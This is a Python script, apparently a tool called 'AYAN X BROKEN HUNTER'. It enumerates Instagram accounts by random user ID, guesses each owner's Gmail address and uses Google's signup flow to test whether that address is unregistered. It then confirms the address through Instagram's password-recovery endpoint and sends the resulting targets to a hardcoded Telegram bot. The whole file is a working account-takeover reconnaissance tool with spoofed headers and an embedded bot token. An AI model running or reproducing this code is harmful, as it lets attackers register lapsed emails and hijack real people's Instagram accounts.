import time
import os
import sys
zorro= "fucked by zorro @fucpy"
for char in zorro:
    sys.stdout.write(char)
    sys.stdout.flush()
    time.sleep(0.05) 
print()
from datetime import datetime
from colorama import Fore, Style, init
init(autoreset=True)
RESET_COL = Style.RESET_ALL
B = Style.BRIGHT
W = Fore.WHITE
LAVENDER = Fore.MAGENTA
LILAC = Fore.LIGHTMAGENTA_EX

def expiry_protect():
    expiry_str = "2076-07-12 15:00:00"
    expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
    current_time = datetime.now()
    if current_time > expiry_date:
        print(f"""
{LILAC}{B}𓆩════════════════════════════𓆪
        🚨 TOOL EXPIRED 🚨
{LAVENDER}{B}𓆩════════════════════════════𓆪
╭────────── 🪻 ──────────╮
│       ⚠️ STATUS • ERROR
├────────────────────────┤
│ ◈ State      ➤ EXPIRED!
│ ◈ Expired on ➤ {expiry_date.strftime('%Y-%m-%d %I:%M %p')}
╰────────── 🪻 ──────────╯
╭────────── 🪻 ──────────╮
│ 🔗 ASSISTANCE
│ ➤ Contact @Broken_hu0 for support
╰────────── 🪻 ──────────╯
{LAVENDER}{B}𓆩════════════════════════════𓆪
""")
        sys.exit(1)
    else:
        remaining = expiry_date - current_time
        days = remaining.days
        hours = remaining.seconds // 3600
        minutes = (remaining.seconds % 3600) // 60
        if days > 0:
            time_left = f"{days} days, {hours} hours, {minutes} minutes"
        elif hours > 0:
            time_left = f"{hours} hours, {minutes} minutes"
        else:
            time_left = f"{minutes} minutes"
        print(f"""
{LILAC}{B}𓆩════════════════════════════𓆪
     ✅ ACTIVATED SUCCESSFULLY
{LAVENDER}{B}𓆩════════════════════════════𓆪
╭────────── 🪻 ──────────╮
│       👤 LICENSE • INFO
├────────────────────────┤
│ ◈ Expiry     ➤ {expiry_date.strftime('%Y-%m-%d %I:%M %p')}
│ ◈ Time Left  ➤ {time_left}
╰────────── 🪻 ──────────╯
{LILAC}{B}𓆩════════════════════════════𓆪
""")
expiry_protect()

import sys
import subprocess
try:
    import h2
except ImportError:
    print("Installing h2...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "h2"])
    import h2
import os
import time
from bs4 import BeautifulSoup
from rich.table import Table
import os
import signal
import datetime
from datetime import date
try:
    from rich.console import Console
    from rich.align import Align
    import requests
    from requests import get
except:
    os.system("pip install requests")
    import requests
    from requests import get
try:
    from user_agent import generate_user_agent
except:
    os.system("pip install user_agent")
    from user_agent import generate_user_agent
try:
    import re
    import httpx
    import user_agent
except:
    os.system("pip install httpx httpx[http2] user_agent")
    import httpx
    import user_agent
try:
    import requests
    import time
    import random
    import faker
    import uuid
    import threading
    import time
except ImportError:
    os.system("pip install requests")
    os.system("pip install faker")
import requests
import time
from user_agent import generate_user_agent
import random
import faker
from faker import Faker
import uuid
from threading import Thread
import webbrowser
try:
    from hashlib import md5
except:
    os.system("pip install hashlib")
    from hashlib import md5
try:
    from random import randrange,choice
except:
    os.system("pip install random")
    from random import randrange,choice
import os
from random import randrange
try:
    import requests
except:
    os.system("pip install requests")
    import requests
try:
    from user_agent import generate_user_agent
except:
    os.system("pip install user_agent")
    from user_agent import generate_user_agent
try:
    from hashlib import md5
except:
    os.system("pip install hashlib")
    from hashlib import md5
try:
    from random import choice
except:
    os.system("pip install random")
    from random import choice
try:
    from concurrent.futures import ThreadPoolExecutor
except:
    os.system("pip install concurrent.futures")
from concurrent.futures import ThreadPoolExecutor
from requests import post as pp
from user_agent import generate_user_agent as gg
from random import choice as cc
from random import randrange as rr
import re
import json
import base64
import string
import logging
from typing import Optional, Set, Dict, Any
from rich import box

class Colors:
    O = '\x1b[38;5;208m'
    R = '\033[1;31m'
    X = '\033[1;33m'
    F = '\033[2;32m'
    C = "\033[1;97m"
    B = '\033[2;36m'
    K = '\033[2;35m'
    C1 = '\033[2;35m'
    B2 = '\033[2;36m'
    Rn = "\033[0m"
    BLUE = '\033[94m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    ORANGE = '\x1b[38;5;208m'
    LIGHT_ORANGE = '\x1b[38;5;214m'
    GOLD = '\x1b[38;5;220m'
    PINK = '\x1b[38;5;205m'
    DEEP_PINK = '\x1b[38;5;198m'
    PURPLE = '\x1b[38;5;93m'
    VIOLET = '\x1b[38;5;129m'
    LIME = '\x1b[38;5;118m'
    TEAL = '\x1b[38;5;30m'
    MINT = '\x1b[38;5;121m'
    SKY_BLUE = '\x1b[38;5;117m'
    NAVY = '\x1b[38;5;18m'

class GoogleTLManager:
    def __init__(self):
        self.tl_file = 'tl.txt'
        self.yy = 'azertyuiopmlkjhgfdsqwxcvbn'
    def _generate_random_string(self, min_len: int, max_len: int) -> str:
        return ''.join(cc(self.yy) for _ in range(rr(min_len, max_len)))
    def fetch_new_tl(self) -> Optional[str]:
        try:
            n1 = self._generate_random_string(6, 9)
            n2 = self._generate_random_string(3, 9)
            host = self._generate_random_string(15, 30)
            he3 = {
                "accept": "*/*",
                "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
                "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
                "google-accounts-xsrf": "1",
                "sec-ch-ua": '"Not)A;Brand";v="24", "Chromium";v="116"',
                "sec-ch-ua-arch": '""',
                "sec-ch-ua-bitness": '""',
                "sec-ch-ua-full-version": '"116.0.5845.72"',
                "sec-ch-ua-full-version-list": '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-model": '"ANY-LX2"',
                "sec-ch-ua-platform": '"Android"',
                "sec-ch-ua-platform-version": '"13.0.0"',
                "sec-ch-ua-wow64": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "x-chrome-connected": "source=Chrome,eligible_for_consistency=true",
                "x-client-data": "CJjbygE=",
                "x-same-domain": "1",
                "Referrer-Policy": "strict-origin-when-cross-origin",
                'user-agent': str(gg()),
            }
            session = requests.Session()
            res1 = session.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=he3)
            match = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text)
            if not match:
                return None
            tok = match.group(2)
            cookies = {'__Host-GAPS': host}
            headers = {
                'authority': 'accounts.google.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf': '1',
                'origin': 'https://accounts.google.com',
                'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https://mail.google.com/mail/u/0/&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
                'user-agent': gg(),
            }
            data = {
                'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
            }
            response = pp(
                'https://accounts.google.com/_/signup/validatepersonaldetails',
                cookies=cookies,
                headers=headers,
                data=data,
            )
            tl = str(response.text).split('",null,"')[1].split('"')[0]
            host = response.cookies.get_dict()['__Host-GAPS']
            try:
                os.remove(self.tl_file)
            except:
                pass
            with open(self.tl_file, 'a') as f:
                f.write(tl + '//' + host + '\n')
            return f'{tl}//{host}'
        except Exception as e:
            logging.error(f"TL Fetch Error: {e}")
            return None
    def get_valid_tl(self) -> str:
        try:
            with open(self.tl_file, 'r') as f:
                content = f.read().splitlines()[0]
                if content:
                    return content
        except:
            pass
        return self.fetch_new_tl() or ""

class GmailChecker:
    def __init__(self):
        self.tl_manager = GoogleTLManager()
    def check(self, email: str) -> str:
        if '@' in email:
            email = str(email).split('@')[0]
        try:
            try:
                o = open('tl.txt', 'r').read().splitlines()[0]
            except:
                self.tl_manager.fetch_new_tl()
                o = open('tl.txt', 'r').read().splitlines()[0]
            tl, host = o.split('//')
            cookies = {'__Host-GAPS': host}
            headers = {
                'authority': 'accounts.google.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf': '1',
                'origin': 'https://accounts.google.com',
                'referer': f'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https://mail.google.com/mail/u/0/&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL={tl}',
                'user-agent': gg(),
            }
            params = {'TL': tl}
            data = f'continue=https://mail.google.com/mail/u/0/&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=["TL:{tl}","{email}",0,0,1,null,0,5167]&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig:1712322460888&cookiesDisabled=false&deviceinfo=[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]&gmscoreversion=undefined&flowName=GlifWebSignIn&'
            response = pp(
                'https://accounts.google.com/_/signup/usernameavailability',
                params=params,
                cookies=cookies,
                headers=headers,
                data=data,
            )
            if '"gf.uar",1' in str(response.text):
                return 'good'
            elif '"er",null,null,null,null,400' in str(response.text):
                self.tl_manager.fetch_new_tl()
                return self.check(email)
            else:
                return 'bad'
        except:
            return self.check(email)

class InstagramScraper:
    @staticmethod
    def generate_android_ua() -> str:
        devices = [
            {"brand": "samsung", "model": "SM-G973F", "device": "beyond1", "board": "exynos9820", "cpu": "exynos9820"},
            {"brand": "samsung", "model": "SM-A536B", "device": "a53x", "board": "s5e8825", "cpu": "exynos1280"},
            {"brand": "samsung", "model": "SM-S918B", "device": "dm1q", "board": "kalama", "cpu": "qcom"},
            {"brand": "Google", "model": "Pixel 6", "device": "raven", "board": "raven", "cpu": "gs101"},
            {"brand": "Google", "model": "Pixel 7", "device": "panther", "board": "panther", "cpu": "gs201"},
            {"brand": "Xiaomi", "model": "M2102J20SG", "device": "ares", "board": "mt6893", "cpu": "mtk"},
            {"brand": "Xiaomi", "model": "Redmi Note 10", "device": "sweet", "board": "sm6150", "cpu": "qcom"},
            {"brand": "OnePlus", "model": "ONEPLUS A6003", "device": "OnePlus6", "board": "sdm845", "cpu": "qcom"},
            {"brand": "OPPO", "model": "CPH2371", "device": "OP4F1F", "board": "mt6893", "cpu": "mtk"},
            {"brand": "HUAWEI", "model": "ELE-L29", "device": "HWELE", "board": "kirin980", "cpu": "hisilicon"},
        ]
        device = random.choice(devices)
        android_version = random.choice(["10", "11", "12", "13", "14"])
        api_level = {"10": "29", "11": "30", "12": "31", "13": "33", "14": "34"}[android_version]
        dpi = random.choice(["320", "360", "394", "411", "420", "440", "450", "480"])
        width = random.choice(["720", "1080", "1440"])
        height = random.choice(["1520", "1600", "2280", "2340", "2400", "2560", "3200"])
        instagram_ver = f"{random.randint(280, 340)}.0.0.{random.randint(10, 40)}.{random.randint(80, 150)}"
        locale = random.choice(["en_US", "en_GB", "ar_SA"])
        random_num = random.randint(300000000, 400000000)
        return (f"Instagram {instagram_ver} Android ({api_level}/{android_version}; "
                f"{dpi}dpi; {width}x{height}; {device['brand']}; {device['model']}; "
                f"{device['device']}; {device['board']}; {locale}; {random_num})")
    @staticmethod
    def get_rest(user: str) -> str:
        try:
            android_ua = InstagramScraper.generate_android_ua()
            ig_did = str(uuid.uuid4()).upper()
            mid = base64.b64encode(uuid.uuid4().bytes).decode()[:32]
            headers = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br, zstd',
                'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'priority': 'u=1, i',
                'referer': 'https://www.instagram.com/accounts/password/reset/?source=fxcal',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
                'sec-ch-ua-full-version-list': '"Chromium";v="148.0.7778.168", "Google Chrome";v="148.0.7778.168", "Not/A)Brand";v="99.0.0.0"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"19.0.0"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (iPad; CPU OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
                'x-asbd-id': '359341',
                'x-csrftoken': 'H1CoCux1VkR2aRz7WQsv8lGE95UVqIbM',
                'x-ig-app-id': '936619743392459',
                'x-ig-max-touch-points': '0',
                'x-ig-www-claim': 'hmac.AR3AqgCGaNYKiaGD2p6t-h92EOVCVTLghiUNPQi3RzQ-KVuI',
                'x-instagram-ajax': '1039957696',
                'x-requested-with': 'XMLHttpRequest',
            }
            r = httpx.Client(http2=True, headers=headers, timeout=20).post(
                "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/",
                data={
                    "email_or_username": user,
                    'flow': 'fxcal',
                    'jazoest': '22680',
                }
            ).text
            try:
                data = json.loads(r)
                if "message" in data:
                    email_match = re.search(r'check\s+([^\s]+?)\s+for a link', data["message"])
                    if email_match:
                        return email_match.group(1)
                    else:
                        return "No Rest"
                elif "contact_point" in data:
                    return data["contact_point"]
                else:
                    return "No Rest"
            except:
                return "No Rest"
            return "No Rest"
        except:
            pass
    @staticmethod
    def get_info(username: str, year: str, jj: str = "gmail.com") -> str:
        try:
            url = f"https://www.instagram.com/{username}/"
            headers = {
                "Host": "www.instagram.com",
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0",
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.9",
                "X-Csrftoken": "LMkm23uLJ7sYpPsMGUDEpE",
                "X-Ig-App-Id": "936619743392459",
                "X-Asbd-Id": "359341",
                "X-Ig-Www-Claim": "0",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": f"https://www.instagram.com/{username}/?__a=1",
            }
            cookies = {
                "csrftoken": "LMkm23uLJ7sYpPsMGUDEpE",
                "ig_did": "21D3196C-4ECC-458F-9151-64F03863854C",
            }
            try:
                clean_username = username.split("@")[0]
                api_url = "https://www.instagram.com/api/v1/users/web_profile_info/"
                params = {"username": clean_username}
                with httpx.Client(http2=True, timeout=30) as client:
                    response = client.get(api_url, headers=headers, cookies=cookies, params=params)
                    if response.status_code != 200:
                        return {
                            'username': username,
                            'email': f"{clean_username}@{jj}",
                            'url': url,
                            'rest': InstagramScraper.get_rest(clean_username)
                        }
                    data = response.json()['data']['user']
                    name = data.get('full_name', '')
                    followers = data.get('edge_followed_by', {}).get('count', 0)
                    following = data.get('edge_follow', {}).get('count', 0)
                    posts = data.get('edge_owner_to_timeline_media', {}).get('count', 0)
                    rest = InstagramScraper.get_rest(clean_username)
                    return f'''
╔   ─────━ ░ AYAN X BROKEN ░ ━─────   ╗
 ⌦ [ @Broken_hu0 ]
     ✺ 𝚗𝚊𝚖𝚎 : {name}
     ✺ username : @{clean_username}
     ✺ 𝙴𝚖𝚊𝚒𝚕 {clean_username}@{jj}
     ✺ 𝚏𝚘𝚕𝚕𝚘𝚠𝚎𝚛𝚜 : {followers}
     ✺ 𝚏𝚘𝚕𝚕𝚘𝚠𝚒𝚗𝚐 : {following}
     ✺ 𝚙𝚘𝚜𝚝𝚜 : {posts}
     ✺ Date Account : {year}
     ✺ 𝗨𝗥𝗟: https://www.instagram.com/{clean_username}/
     ✺ 𝚛𝚎𝚜𝚝 : {rest}
 ◢─────━ ░ AYAN X BROKEN ░━──────◣
        Dev    : @Broken_hu0
        Collabel: AYAN_X_BROKEN
    '''
            except:
                pass
                rest = InstagramScraper.get_rest(clean_username)
                return f'''
╔   ─────━ ░ AYAN X BROKEN ░ ━─────   ╗
 ⌦ [ @Broken_hu0 ]
     ✺ username : @{clean_username}
     ✺ 𝙴𝚖𝚊𝚒𝚕 {clean_username}@{jj}
     ✺ 𝗨𝗥𝗟: https://www.instagram.com/{clean_username}/
     ✺ 𝚛𝚎𝚜𝚝 : {rest}
 ◢─────━ ░ AYAN X BROKEN ░━──────◣
        Dev    : @Broken_hu0
        Collabe: AYAN_X_BROKEN
    '''
        except:
            pass

class TelegramNotifier:
    def __init__(self, token: str, chat_id: str):
        self.token = token
        self.chat_id = chat_id
    def send(self, text: str) -> bool:
        def _send():
            try:
                requests.get(f"https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.chat_id}&text={text}", timeout=3)
            except:
                pass
        Thread(target=_send).start()
        return True

class AccountValidator:
    def __init__(self, token: str, chat_id: str, year: str):
        self.telegram = TelegramNotifier(token, chat_id)
        self.gmail_checker = GmailChecker()
        self.year = year
        self.hits = 0
        self.bads_instagram = 0
        self.bads_email = 0
        self.lock = threading.Lock()
        self.current_email = ""
        self.colors = [Colors.RED, Colors.GREEN, Colors.YELLOW, Colors.BLUE, Colors.MAGENTA, Colors.CYAN, Colors.ORANGE, Colors.PINK, Colors.VIOLET, Colors.LIME]
    def update_stats(self, hits: int = 0, bad_insta: int = 0, bad_email: int = 0):
        with self.lock:
            self.hits += hits
            self.bads_instagram += bad_insta
            self.bads_email += bad_email
    def display_status(self, current_email: str = ""):
        self.current_email = current_email
        os.system('clear' if os.name == 'posix' else 'cls')
        rand_color1 = random.choice(self.colors)
        rand_color2 = random.choice(self.colors)
        rand_color3 = random.choice(self.colors)
        print(f"""
{rand_color1}╔══════════════════════════════════════════════════════════════╗
║                 AYAN X BROKEN HUNTER v1.4.2                       ║
╠══════════════════════════════════════════════════════════════╣
║  {Colors.GREEN}▶ HITS              {Colors.RESET}: {Colors.GOLD}[ {self.hits} ]{Colors.RESET}                                     ║
║  {Colors.RED}▶ BAD INSTAGRAM      {Colors.RESET}: {Colors.RED}[ {self.bads_instagram} ]{Colors.RESET}                                 ║
║  {Colors.ORANGE}▶ BAD GMAIL         {Colors.RESET}: {Colors.ORANGE}[ {self.bads_email} ]{Colors.RESET}                                     ║
║  {Colors.CYAN}▶ CURRENT EMAIL     {Colors.RESET}: {Colors.CYAN}[ {current_email} ]{Colors.RESET}                          ║
╠══════════════════════════════════════════════════════════════╣
║  {rand_color2}💻 DEV : @Broken_hu0  |  Collabe : AYAN_X_BROKEN{Colors.RESET}            ║
╚══════════════════════════════════════════════════════════════╝
""")
    def process_email(self, email: str):
        try:
            csrftoken = md5(str(time.time()).encode()).hexdigest()
            android_ua = InstagramScraper.generate_android_ua()
            ua = generate_user_agent()
            pp_choice = choice('00')
            self.display_status(email)
            if pp_choice == '0':
                headers = {
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://www.instagram.com',
                    'referer': 'https://www.instagram.com/accounts/signup/email/',
                    'user-agent': ua,
                    'x-csrftoken': csrftoken
                }
                client = httpx.Client(http2=True, timeout=10, limits=httpx.Limits(max_connections=100))
                response = client.post(
                    "https://i.instagram.com/api/v1/users/check_email/",
                    data=f"email={email}",
                    headers={'User-Agent': android_ua, 'content-type': "application/x-www-form-urlencoded; charset=UTF-8"}
                )
                client.close()
                if 'email_is_taken' in str(response.text):
                    self.handle_valid_email(email)
                else:
                    self.update_stats(bad_insta=1)
            elif pp_choice == '1':
                headers = {
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://www.instagram.com',
                    'referer': 'https://www.instagram.com/?lang=en-US&hl=en-gb',
                    'user-agent': ua,
                    'x-csrftoken': csrftoken,
                }
                data = {'username': email.split('@')[0]}
                response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data=data, timeout=10).text
                if '"user":true' in response:
                    self.handle_valid_email(email)
                else:
                    self.update_stats(bad_insta=1)
        except:
            self.update_stats(bad_insta=1)
    def handle_valid_email(self, email: str):
        try:
            if 'good' == self.gmail_checker.check(email):
                username, jj = email.split('@')
                msg = InstagramScraper.get_info(username, self.year, jj)
                rest_email = InstagramScraper.get_rest(username)
                if rest_email and rest_email != "No Rest":
                    masked_user = rest_email.split('@')[0] if '@' in rest_email else rest_email
                    masked_user = masked_user.rstrip('.')
                    first_match = username[0].lower() == masked_user[0].lower()
                    last_match = username[-1].lower() == masked_user[-1].lower()
                    if not (first_match and last_match):
                        self.update_stats(bad_insta=1)
                        return
                else:
                    self.update_stats(bad_insta=1)
                    return
                self.update_stats(hits=1)
                if self.hits % 10 == 0 and os.path.exists("tl.txt"):
                    os.remove("tl.txt")
                with open('hits1.txt', 'a', encoding='utf-8') as ff:
                    ff.write(f'{msg}\n')
                self.telegram.send(msg)
            else:
                self.update_stats(bad_email=1)
        except:
            self.update_stats(bad_email=1)

class UserCollector:
    def __init__(self, validator: AccountValidator, uid1: int, uid2: int):
        self.validator = validator
        self.uid1 = uid1
        self.uid2 = uid2
        self.ids_set = set()
        self.found_usernames = set()
    def _rand_id(self) -> str:
        while True:
            Id = str(random.randrange(self.uid1, self.uid2))
            if Id not in self.ids_set:
                self.ids_set.add(Id)
                return Id
    def start(self, num_threads: int = 50):
        def worker():
            while True:
                try:
                    rnd = str(random.randint(150, 999))
                    user_agent_str = (
                        "Instagram 311.0.0.32.118 Android ("
                        + random.choice(["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"])
                        + "; "
                        + str(random.randint(100, 1300))
                        + "dpi; "
                        + str(random.randint(200, 2000))
                        + "x"
                        + str(random.randint(200, 2000))
                        + "; "
                        + random.choice(["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME", "INFINIX"])
                        + "; SM-T"
                        + rnd
                        + "; SM-T"
                        + rnd
                        + "; qcom; en_US; 545986"
                        + str(random.randint(111, 999))
                        + ")"
                    )
                    Id = self._rand_id()
                    lsd = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=32))
                    headers = {
                        'accept': '*/*',
                        'accept-language': 'en,en-US;q=0.9',
                        'content-type': 'application/x-www-form-urlencoded',
                        'dnt': '1',
                        'origin': 'https://www.instagram.com',
                        'priority': 'u=1, i',
                        'referer': 'https://www.instagram.com/cristiano/following/',
                        'user-agent': user_agent_str,
                        'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query',
                        'x-fb-lsd': lsd,
                    }
                    data = {
                        'lsd': lsd,
                        'fb_api_caller_class': 'RelayModern',
                        'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
                        'variables': f'{{"userID":"{Id}","username":"cristiano"}}',
                        'server_timestamps': 'true',
                        'doc_id': '7666785636679494',
                    }
                    response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
                    resp_json = response.json()
                    user_data = resp_json.get('data', {}).get('user', {})
                    if not user_data:
                        continue
                    username = user_data.get('username', '')
                    follower_count = user_data.get('follower_count', 0)
                    is_private = user_data.get('is_private', True)
                    MIN_FOLLOWERS = 5
                    if (not username or username in self.found_usernames or
                        any(x in username for x in ["_"]) or len(username) < 9 or
                        is_private or follower_count < MIN_FOLLOWERS):
                        continue
                    self.found_usernames.add(username)
                    email = f'{username}@gmail.com'
                    self.validator.process_email(email)
                except:
                    continue
        for _ in range(num_threads):
            t = Thread(target=worker)
            t.daemon = True
            t.start()
        while True:
            time.sleep(1)

def main():
    console = Console()
    table = Table(
        show_header=False,
        box=box.ASCII,
        pad_edge=False,
        border_style="bold green",
        title="[bold yellow]--- WELCOME TO AYAN X BROKEN ---[/]"
    )
    table.add_column(justify="center", width=80)
    table.add_row("The Tool By : AYAN X BROKEN")
    table.add_row("DEV : @Broken_hu0")
    table.add_row("Collabe : AYAN_X_BROKEN")
    table.add_row("")
    table.add_row("")
    table.add_row("[blink bold red]< AYAN X BROKEN HUNTING >[/]")
    table.add_row(f"Date & Time : {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    table.add_row(f"PID : {os.getpid()} | Status : Active")
    table.add_row("Version : v1.4.2")
    table.add_row("—" * 78)
    console.print(Align.center(table))
    webbrowser.open("https://t.me/Broken_hu0")

    # ─── HARDCODED VALUES ───
    year = "2012"
    token = "8760415886:AAH-JhrbqKGtfyc_-zJ4ewGedle2Q-vvJj0"
    chat_id = "8598993143"
    # ─────────────────────────

    uid_ranges = {
        "1": (220468786, 259736186),
        "2": (310438486, 495999999),
        "3": (1219010000, 1429010000),
        "4": (1700000000, 2400000000),
        "5": (3313668786, 3713668786),
        "6": (5398785217, 5999785217),
        "7": (7497939245, 8597939245),
        "8": (11254029834, 21254029834),
        "9": (40064475395, 43464475395),
    }
    # Year 2012 = key "1"
    uid1, uid2 = uid_ranges["1"]

    os.system('clear' if os.name == 'posix' else 'cls')
    GoogleTLManager().fetch_new_tl()
    time.sleep(0.2)
    os.system('clear' if os.name == 'posix' else 'cls')
    validator = AccountValidator(token, chat_id, year)
    collector = UserCollector(validator, uid1, uid2)
    collector.start()

if __name__ == "__main__":
    main()